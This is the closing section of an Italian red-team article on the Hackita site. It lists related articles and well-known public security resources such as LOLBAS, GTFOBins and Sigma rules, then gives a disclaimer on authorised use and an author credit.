* 📖 [Sysmon: configurazione avanzata per il Blue Team](https://hackita.it/articoli/sysmon-blue-team-configurazione)
* 📖 [MITRE ATT\&CK: come usarlo nel pentesting](https://hackita.it/articoli/mitre-attack-pentesting)
* 📖 [Red Team vs Blue Team: engagement reale](https://hackita.it/articoli/red-team-blue-team-engagement)
* 📖 [Evasione EDR: tecniche e metodologie](https://hackita.it/articoli/evasione-edr-tecniche)
* 📖 [PowerShell per il Pentesting: guida completa](https://hackita.it/articoli/powershell)
* 📖 [Post-Exploitation Windows: cosa fare dopo l'accesso iniziale](https://hackita.it/articoli/post-exploitation-windows)

### Risorse esterne

* 🔗 [LOLBAS Project](https://lolbas-project.github.io) — database completo LOLBins Windows
* 🔗 [GTFOBins](https://gtfobins.github.io) — database completo Linux/Unix
* 🔗 [LOOBins](https://www.loobins.io) — LOLBins macOS
* 🔗 [LOLDrivers](https://www.loldrivers.io) — driver Windows abusabili
* 🔗 [MITRE ATT\&CK — Defense Evasion T1218](https://attack.mitre.org/tactics/TA0005/) — mappatura tecniche
* 🔗 [Sigma Rules GitHub](https://github.com/SigmaHQ/sigma) — regole detection per SIEM (sistema centralizzato che raccoglie e analizza i log di sicurezza di tutta la rete)
* 🔗 [Sysmon Download](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon) — telemetria (i dati di log e monitoraggio raccolti da tool di sicurezza come Sysmon o gli EDR) avanzata Windows
* 🔗 [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) — repository payload e tecniche
* 🔗 [HackTricks](https://book.hacktricks.xyz) — enciclopedia del pentesting
* 🔗 [Impacket](https://github.com/fortra/impacket) — toolkit Python per protocolli Windows
* 🔗 [LOLBAS GitHub Repository](https://github.com/LOLBAS-Project/LOLBAS) — sorgente YML del progetto
* 🔗 [DerbyCon 2018 — Nothing to LOL about](https://github.com/api0cradle/DerbyCon2018) — talk originale Oddvar Moe

***

> ⚠️ **Disclaimer:** Tutte le tecniche descritte in questo articolo sono a scopo esclusivamente didattico. L'utilizzo su sistemi senza esplicita autorizzazione scritta è illegale (Art. 615-ter c.p., D.Lgs. 231/2001). Hackita promuove la sicurezza informatica etica e responsabile.

***

*Autore: Team Hackita — Categoria: Red Team — Aggiornato: Giugno 2026*
